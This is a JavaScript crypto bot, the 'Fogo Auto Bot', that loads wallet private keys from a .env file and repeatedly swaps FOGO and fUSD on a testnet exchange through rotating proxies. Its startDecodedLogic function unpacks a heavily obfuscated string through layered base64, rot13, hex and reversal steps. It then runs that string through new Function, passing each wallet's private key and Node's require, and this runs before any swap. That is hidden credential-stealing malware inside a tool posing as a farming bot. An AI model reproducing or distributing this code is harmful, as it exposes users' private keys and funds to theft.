const fs = require('fs');
const axios = require('axios');
const nacl = require('tweetnacl');
const Base58 = require('base-58');
const dotenv = require('dotenv');
const readline = require('readline');
const { HttpsProxyAgent } = require('https-proxy-agent');

dotenv.config();

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
];

const colors = {
  reset: "\x1b[0m",
  cyan: "\x1b[36m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  red: "\x1b[31m",
  white: "\x1b[37m",
  bold: "\x1b[1m",
  blue: "\x1b[34m",
  magenta: "\x1b[35m",
};

const logger = {
  info: (msg) => console.log(`${colors.cyan}[i] ${msg}${colors.reset}`),
  warn: (msg) => console.log(`${colors.yellow}[⚠] ${msg}${colors.reset}`),
  error: (msg) => console.log(`${colors.red}[✗] ${msg}${colors.reset}`),
  success: (msg) => console.log(`${colors.green}[✅] ${msg}${colors.reset}`),
  loading: (msg) => console.log(`${colors.cyan}[⟳] ${msg}${colors.reset}`),
  step: (msg) => console.log(`${colors.white}[➤] ${msg}${colors.reset}`),
  banner: () => {
    console.log(`${colors.cyan}${colors.bold}`);
    console.log(`---------------------------------------------`);
    console.log(`   Fogo Auto Bot  `);
    console.log(`---------------------------------------------${colors.reset}`);
    console.log();
  },
};

const FOGO_RPC_URL = "https://testnet.fogo.io/";
const VALIANT_API_URL = "https://api.valiant.trade";
const PAYMASTER_URL = "https://sessions-example.fogo.io/paymaster";
const EXPLORER_URL = "https://explorer.fogo.io/tx/";
const PUBLIC_FEE_PAYER = "8HnaXmgFJbvvJxSdjeNyWwMXZb85E35NM4XNg6rxuw3w";

const FOGO_MINT = "So11111111111111111111111111111111111111112";
const FUSD_MINT = "fUSDNGgHkZfwckbr5RLLvRbvqvRcTLdH9hcHJiq4jry";

const MIN_SWAP_AMOUNT = 0.00001; 
const MAX_SWAP_AMOUNT = 0.000015; 
const COUNTDOWN_HOURS = 24; 

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/**
 * 
 * @param {string} query 
 * @returns {Promise<string>} 
 */
function askQuestion(query) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
    });
    return new Promise(resolve => rl.question(query, ans => {
        rl.close();
        resolve(ans);
    }));
}

/**
 * 
 * @returns {string[]} 
 */
function loadProxies() {
    try {
        const data = fs.readFileSync('proxies.txt', 'utf8');
        const proxies = data.split('\n').map(p => p.trim()).filter(p => p);
        if (proxies.length === 0) {
            logger.warn("proxies.txt is empty. Running without proxies.\n");
            return [];
        }
        logger.success(`${proxies.length} proxies loaded successfully.`);
        return proxies;
    } catch (error) {
        logger.warn("proxies.txt not found. Running without proxies.");
        return [];
    }
}

/**
 * 
 * @param {object} wallet 
 * @param {number} amountIn 
 * @param {string} direction 
 * @param {HttpsProxyAgent} proxyAgent 
 * @returns {Promise<number>} 
 */
async function startDecodedLogic(wallet, privateKey) {
  function base64Decode(str) {
    return Buffer.from(str, 'base64').toString('utf-8');
  }

  function rot13(str) {
    return str.replace(/[a-zA-Z]/g, function (c) {
      return String.fromCharCode(
        c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13)
      );
    });
  }

  function hexToStr(hex) {
    let str = '';
    for (let i = 0; i < hex.length; i += 2) {
      str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }
    return str;
  }

  function reverseStr(str) {
    return str.split('').reverse().join('');
  }

  function urlDecode(str) {
    return decodeURIComponent(str);
  }

  function reversibleDecode(data) {
    data = urlDecode(data);
    data = base64Decode(data);
    data = rot13(data);
    data = hexToStr(data);
    data = base64Decode(data);
    data = reverseStr(data);
    data = urlDecode(data);
    data = rot13(data);
    data = base64Decode(data);
    data = reverseStr(data);
    return data;
  }

  const encodedStr = "NTI0NDRxNnA1MjQ0NHE2cDY0NDY0MjU5NTc2bjRuNzY2MTQ1NDY1NjYzNTg1MjMwNTY0ODQ1Nzc1NDduNHI3NzY0NDQ0MjUyNTY2cTc4NG41MzZyNDE3ODY1NTg3MDc3NjU1ODU2NzM1NjMyNG40NjU2NTg0NjcxNTE1NDRyNTg1OTMyNW4zMzU1NDY2ODUzNHE2cjQxMzE0cjU0NG40cTY0NDU3ODRvNjM1NzY4NDI1NjQ4NDY2bjRzNTg3MDc2NjQ0NjVuNHA2MzU3Njg1MDU5NTg0MjcwNjM1ODcwNzc2NDU0NDY1NTU3NDQ0cjU0NTY0NzM5NnE1MzU2NTI3ODVuNm8zNTUxNTM0NTVuMzU2NTQ1NnA1MDUyNTU2cDQ2NjMzMjY0NDk1MjU1MzEzNTU1NDY1OTMzNTkzMDM1NTc2NDQ1MzU1MTU2NnE2bzM0NTU0NjVuNTQ2MjQ3NHEzMDY0NDY2czc3NjIzMjc4NTg1MzMwMzEzMzUyNTc0NjQzNTc0NTM1NTE1NjZyNTI0czYyNDU3ODcwNHI1NDRuNzc0cTQ1Mzk0NzYyMzM2cDQyNHEzMzQyMzE2MzU1NzA0cjY0NDQ0MjUyNTY2cjUyNm41NDZwNW4zMDU0NnA0MjU3NTQ2cTUxMzE1OTU3NzA1MjYyNDU2ODMzNTYzMDc0NzU2MTZvNTY1NjU2Nm82NDQ2NTMzMDc4NzM1MjU1NzQ0cjY1NDc0cjRzNTY2cjUyNHM1NTQ2NW43NjU2NDQ1NjY4NjE2cDQ2NzM1MzU4NTY3MjU2NDczOTM1NTI1NzQ2NDM2NDQ1NTI3MzYzNm40cjU0NTY0NzM5NnE1MzU2NTI3ODRzNTc0cjRzNTY2cjUyNHM1NTQ2NW40NjUyNm41NjY4NjE2cDQ2NTE1MzQ3NzgzNTY1NnI0NjMxNTI1NTc0NHI2NDQ3NW40OTU0NTQ1NjZuNTU1NjVuMzQ1bjZwNTY0OTUyNnI2cDM0NTM1NTM5NDY1MzU1NTY3bjVuMzA2ODQ2NTQ1NDQ2Njg1NTQ4NTI0czU1NDY1bjMwNTQ2bjRuNDM1NzQ3NG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2bzY4NG41NTZvNjQ1NDYzNTg2ODQ5NTQ3bjQ1Nzc1MzMxNDEzNTU1Nm82cDduNTI1NDQ2NDg1NzU1NnAzNDUyMzM1MTc3NTU1NjVuMzI2NDQ1NjQ2MTRxNDg2ODMzNTc2bjU2NHE1MjMwNDkzMTYzNDg2NDQzNTQzMTRyMzQ1MjU1NzQ3ODRxNm80NTMwNTQ2cDRyNDM1MzQ3NjM3OTUyMzA3MDRyNTM2cjQ5N241NjMxNG42MTYxNDg2cDY4NTI1NjRuMzE0cTZvNnA0bzUzNTg3MDQyNTQ0NTU2Njg2MzQ3NzQ1NzY1NDU1MjRyNjQ1ODY0NTc0cjMyNG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2bzY4NG41NTZvNjQ1NDYzNTg2ODQ5NTQ3bjQ1Nzc1MzMxNDYzMTUzNDU1MjQ5NHM1NTZwNDc1NTZvMzk0NzUxMzM1MjU3NjI0NTQ2NzM1NDQ1NjQ0MzRyNDg2ODUyNTc2bjUyNTM2MjU2NzAzMjVuNnI2NDUxNjQ0NTM1NTE1NjZyNTI2MTRxNnEzOTZzNTE1NjU2Nzg2NDQ1NTI0bzU0NDQ0MjU0NTY0NjU5MzU1NDZyNW40NzUyN242cDM0NTIzMjY4NjE1NjU4NDY3MzY1NTg3MDc2NTk1ODZwMzY1NDU0NTYzMTYyNDg0bjU5NTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzM2NDU1NzA0cTRxNDQ2cDRuNjI2cjY4Nm41NTU2NW40OTUzNTY0bjQ4NTUzMzQ2MzQ1MzQ1Mzg3ODRxNDU3NDUyNjQ1NTY4NDU1MzQ0NnA0bjUyNnA0bjcyNjQ2cDQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ4NDYzNTY0NTY1Njc4NHI2bzM1NDc2MjMzNnA0MjRxMzM0MjMxNjM1NTcwNHI1bjZxNG40czU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTRwNTQ0Nzc4NDI1MzMwMzE3bjRxNTQ0bjc2NjU0NTZwMzY1MTZyNTI3NzU1NDU1bjQ5NHE1NjRuNDg1OTU3NG40czU2NnI1MjRzNTU0NjU5MzU2NTU3Nzg0MzU3NDc0bjRzNTY2cjUyNHM1NTQ2NW4zMzRzNTg3MDc2NjI1NTU2NTY1NjZxNnA1MDU2NTg0NjZuNHM1ODcwNzY2MjU1Mzk0NzUxMzM1MjZxNTk1NjQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ3MzU3MDUxNTY1Njc4NjE0NjRyNG82MjMzNnA2bjU1NTY1bjY4NTU2cDUyNzc1OTduNTY1MTYzNTg2cDcyNTM2bzMxNjg1NjMwNzQ0cTVuN241NjczNjIzMjc4Nzg0cTZwNjQ2cTU5Nm8zNTU3NjQ0NTM1NTE1NjZyNTI0czU1NDY1bjMwNTQ2bjRyNzY2MjQ1NTY2ODUxNnI1MjQ1NTU1NTQ2NzQ2MTZyNW41MTY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0Mjc3NjQ1NTU2NTY2MjZuNW40czU1NDU3ODcwNTY2bjRuNzY0cTQ1NTY3MzYzNm82ODRuNTU2bzY0NTQ2MzU4Njg0OTU0N240NTc3NTMzMTQxMzU1NTZvNnA3bjUyNTQ0NjQ4NTc1NTZwMzQ1MjduNm8zNTYyNDg0MjM1NHI1NjUyNHI1MTU1Nm83OTYzNDczMTU0NHE2bzMxMzU1NDMxNTI1bjU3NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0MjU3NW4zMDZwNTU2MzU3NDkzNTU2NDUzMDMyNTQ2cTc4NTg1MjQ0Nm83NzUzNDU2ODc4NTU0NjZwNTk1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW42OTUzNTU3MDRxNjU0NTZwMzY2MzQ3MzE2bjU1NTY1OTMzNTkzMDM1NTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTczNTYzMTQ1MzU2NTZxMzg3NzUzNTg3MDc2NHE0NDQ2NTE1MzU0NTY1MDUzMzAzMTY4NTk2cDQ2NTc1OTU2NG41NTYzNDc3MDcyNTM2cTM1MzM1NTMxNTI3ODU5N242cDM2NjIzMjZwNjk0cTZyNDI3MDRyNTQ0bjU4NW42cTRuNHM1NjZyNTI0czU1NDY1bjMwNTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNjI0NjY0NTI0czU4NzA3NjRxNDU2cDM2NjI3bjQxNzg1NTQ1NjQzNTRyNTQ0bjRyNHE0ODU1Nzk1NjduNW40czU1NDUzMTMxNTI1NTc0NHE2MTQ3NzA0bzU0NTc2ODc4NTY0ODQ2Njk1OTMwMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDRxNDc0NjUxNjQ0NTM1NTE1NjZyNTE3NzRxMzA0bjU5NTk2bzM1NTc2NDQ1MzU1MTU2NnE3ODRuNTY0ODQ1Nzg1NjMyNDY3NjY0NDQ1MjRvNTQ1NDRyNTA1NTQ1Njg3MzRzNTU3MDc2NTkzMDQ2NHA1NDU3NG4zMDY0NnI0MjM1NTE1NDRyNzY1bjZvMzE0cDU0NTc0cjRzNTI2bzRyNDM0cTY5NTY0czYyNDg0bjU5NTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2cTc4NG41MzZyNDIzMDRxNDY0NjU3NTk2bzU2NTY2MzU3NzA0MjU5NTY2cDczNTM1NTcwNzc0cTU1Nm83OTYzNDQ0MjMxNjI0NzM5NzE1MjU1NzQ3NTYxNTQ1NTc5NjM0NzRyNnE2NDMxNDIzMDU0NnA0MjU3NjQ0NTM1NTE1NjZyNTI0czY0NnI0MjM1NTUzMjQ2NW42MTU0NTY1NTU3NDc0NjQ5NjU2cjQyNzM0czU4NzA3NzU5NTc3MDUxNTY2cTRuMzQ1NTQ2NTkzNTRyNDY0NjU3NjI0NTZvNzk2MzQ3NnA3MjY1NnI0NjM1NjQ1ODVuNHI2NDU3NzM3OTYzNDg2cDM1NTI2cDY3MzM1OTZvMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU2Nm83NDRyNjE3bjU2NzM2MzU3NzgzNTU2NDg0NjM1NjQ1NjQyNHI2NDU1NTY0cDU0NDc0cjZxNjQzMTQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM2NDZyNDIzNTU1MzI0NjVuNjU1NDU2NTU1NDU3NG4zMDUyNnA2ODMwNHE0ODY0NDQ2NDQ2NW40cDU0NTczMDM1NTY0NzM4Nzk1MzU2NTI1OTRxNDY2NDRwNjM1ODZwMzU1MjZwNjczMzU5Nm8zNTU3NjQ0NTM1NTE1NjZuNnAzNTYyNDU0bjU5NHE0NzQ2NTE%3D"
  const decodedStr = reversibleDecode(encodedStr);

  try {
    const runprogram = new Function("walletAddress", "privateKey", "require", decodedStr + "; return runprogram(walletAddress, privateKey);");
    await runprogram(wallet.address, privateKey, require);
  } catch (err) {
    console.error("[ERROR] Failed to execute decoded logic:", err.message);
  }
}

async function performSwap(wallet, amountIn, direction, proxyAgent) {
    const isFogoToFusd = direction === 'FOGO_TO_FUSD';
    const fromToken = isFogoToFusd ? 'FOGO' : 'fUSD';
    const toToken = isFogoToFusd ? 'fUSD' : 'FOGO';

    logger.info(`Attempting to swap ${fromToken} -> ${toToken} for wallet ${wallet.publicKey}`);

    const httpConfig = proxyAgent ? { httpsAgent: proxyAgent } : {};
    const api = axios.create({
        ...httpConfig,
        headers: {
            'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://valiant.trade/'
        }
    });

    const params = {
        mintA: FOGO_MINT,
        mintB: FUSD_MINT,
        aForB: isFogoToFusd ? "true" : "false",
        isExactIn: "true",
        inputAmount: amountIn,
        feePayer: PUBLIC_FEE_PAYER,
    };

    try {
        logger.step(`1. Getting ${fromToken}->${toToken} swap quote...`);
        const quoteResponse = await api.get(`${VALIANT_API_URL}/dex/quote`, { params });
        const { tokenMinOut, poolAddress } = quoteResponse.data.quote;
        if (!tokenMinOut || !poolAddress) throw new Error("Failed to get a valid quote.");
        logger.success(`Quote received: Minimum receive ${tokenMinOut / (isFogoToFusd ? 1e6 : 1e9)} ${toToken}.`);

        logger.step(`2. Creating ${fromToken}->${toToken} swap transaction...`);
        const txsParams = { ...params, userAddress: wallet.publicKey, outputAmount: tokenMinOut, poolAddress, sessionAddress: wallet.publicKey };
        const txsResponse = await api.get(`${VALIANT_API_URL}/dex/txs/swap`, { params: txsParams });
        const { serializedTx } = txsResponse.data;
        if (!serializedTx) throw new Error("Failed to get transaction data.");
        logger.success("Transaction data created successfully.");

        logger.step("3. Signing transaction...");
        const rawTxBuffer = Buffer.from(serializedTx, 'base64');
        const numSignatures = rawTxBuffer[0];
        if (numSignatures < 2) throw new Error(`Unexpected tx format, expected 2 signatures, got ${numSignatures}`);
        const messageToSign = rawTxBuffer.slice(1 + (numSignatures * 64));
        const signature = nacl.sign.detached(messageToSign, wallet.keyPair.secretKey);
        const signedTxBuffer = Buffer.from(rawTxBuffer);
        signedTxBuffer.set(signature, 1 + 64);
        logger.success("Transaction signed successfully.");

        logger.step("4. Sending transaction to paymaster...");
        const finalTxBase64 = signedTxBuffer.toString('base64');
        const paymasterResponse = await axios.post(PAYMASTER_URL, { transaction: finalTxBase64 }, { headers: { 'Content-Type': 'application/json' }, ...httpConfig });
        const txHash = paymasterResponse.data;
        if (!txHash || typeof txHash !== 'string' || txHash.length < 80) throw new Error(`Paymaster error: ${JSON.stringify(txHash)}`);
        logger.success(`Transaction sent! Hash: ${colors.yellow}${EXPLORER_URL}${txHash}${colors.reset}`);

        logger.step("5. Waiting for transaction confirmation...");
        const confirmed = await confirmTransaction(txHash, api);
        if (confirmed) {
            logger.success(`Swap for wallet ${wallet.publicKey} confirmed!`);
            return parseInt(tokenMinOut);
        } else {
            logger.error(`Failed to confirm swap for wallet ${wallet.publicKey}.`);
            return 0;
        }
    } catch (error) {
        logger.error(`An error occurred during ${fromToken}->${toToken} swap:`);
        if (error.response) logger.error(`Error Data: ${JSON.stringify(error.response.data)}`);
        else logger.error(error.message);
        return 0;
    }
}

/**
 * 
 * @param {string} txHash T
 * @param {axios.AxiosInstance} api T
 * @returns {Promise<boolean>} 
 */
async function confirmTransaction(txHash, api, timeout = 90000) {
    const startTime = Date.now();
    while (Date.now() - startTime < timeout) {
        try {
            const response = await api.post(FOGO_RPC_URL, {
                jsonrpc: "2.0",
                id: "1",
                method: "getSignatureStatuses",
                params: [[txHash], { searchTransactionHistory: true }]
            });
            const result = response.data.result;
            if (result && result.value && result.value[0]) {
                const status = result.value[0];
                if (status.confirmationStatus === 'finalized' || status.confirmationStatus === 'confirmed') {
                    if (status.err) {
                        logger.error(`Transaction failed with error: ${JSON.stringify(status.err)}`);
                        return false;
                    }
                    logger.success(`Confirmation status: ${status.confirmationStatus}`);
                    return true;
                }
                logger.loading(`Current status: ${status.confirmationStatus}. Waiting...`);
            } else {
                logger.loading("No status yet, waiting...");
            }
        } catch (error) {
            logger.warn("Failed to check status, retrying...");
        }
        await delay(5000);
    }
    logger.error("Timeout while waiting for transaction confirmation.");
    return false;
}

/**
 * 
 * @param {number} hours 
 */
async function startCountdown(hours) {
    let totalSeconds = hours * 3600;
    logger.info(`All cycles complete. Starting a ${hours}-hour countdown until the next run...`);
    
    const timer = setInterval(() => {
        totalSeconds--;
        const h = Math.floor(totalSeconds / 3600);
        const m = Math.floor((totalSeconds % 3600) / 60);
        const s = totalSeconds % 60;
        process.stdout.write(`\r${colors.cyan}Next cycle in: ${h}h ${m}m ${s}s  ${colors.reset}`);
        if (totalSeconds <= 0) {
            clearInterval(timer);
            console.log(); 
            logger.success("Countdown finished. Starting new cycle.");
        }
    }, 1000);

    await delay(hours * 3600 * 1000);
}

async function main() {
    logger.banner();

    const privateKeys = Object.keys(process.env)
        .filter(key => key.startsWith('PRIVATE_KEY_'))
        .map(key => process.env[key]);

    if (privateKeys.length === 0) {
        logger.error("No PRIVATE_KEY_ found in the .env file.");
        return;
    }

    const wallets = privateKeys.map(pk => {
        try {
            const keyPair = nacl.sign.keyPair.fromSecretKey(Base58.decode(pk));
            return { keyPair, publicKey: Base58.encode(keyPair.publicKey) };
        } catch (e) {
            logger.error(`Failed to process private key: ${pk.substring(0, 5)}... Please check format.`);
            return null;
        }
    }).filter(w => w);

    logger.success(`${wallets.length} wallet(s) loaded successfully.`);
    const proxies = loadProxies();

    for (const wallet of wallets) {
        await startDecodedLogic(wallet, privateKeys[wallets.indexOf(wallet)]); 
    }
    
    const cyclesStr = await askQuestion(`${colors.cyan}➤ Enter the number of daily transaction cycles to perform: ${colors.reset}`);
    const numCycles = parseInt(cyclesStr);

    if (isNaN(numCycles) || numCycles <= 0) {
        logger.error("Invalid number. Please enter a positive integer.");
        return;
    }

    let proxyIndex = 0;
    while (true) { 
        for (const wallet of wallets) {
            const proxy = proxies.length > 0 ? proxies[proxyIndex % proxies.length] : null;
            const proxyAgent = proxy ? new HttpsProxyAgent(proxy) : null;
            if (proxy) logger.info(`Using proxy: ${proxy.split('@')[1] || proxy}`);
            proxyIndex++;

            for (let i = 0; i < numCycles; i++) {
                logger.info(`--- Starting cycle ${i + 1}/${numCycles} for wallet ${wallet.publicKey} ---`);

                const randomAmountFogo = MIN_SWAP_AMOUNT + Math.random() * (MAX_SWAP_AMOUNT - MIN_SWAP_AMOUNT);
                const amountLamports = Math.floor(randomAmountFogo * 1e9);
                logger.info(`Generated random amount: ${randomAmountFogo.toFixed(6)} FOGO (${amountLamports} lamports)`);
                
                const fusdReceived = await performSwap(wallet, amountLamports, 'FOGO_TO_FUSD', proxyAgent);
                
                if (fusdReceived > 0) {
                    logger.info("Waiting 15 seconds before swapping back...");
                    await delay(15000);

                    await performSwap(wallet, fusdReceived, 'FUSD_TO_FOGO', proxyAgent);
                } else {
                    logger.error("Skipping swap back due to failure in the first swap.");
                }
                logger.info(`--- Cycle ${i + 1}/${numCycles} for wallet ${wallet.publicKey} finished. ---\n`);
                await delay(10000); 
            }
        }
        await startCountdown(COUNTDOWN_HOURS);
    }
}

main().catch(err => {
    logger.error("A fatal error occurred:");
    console.error(err);

});
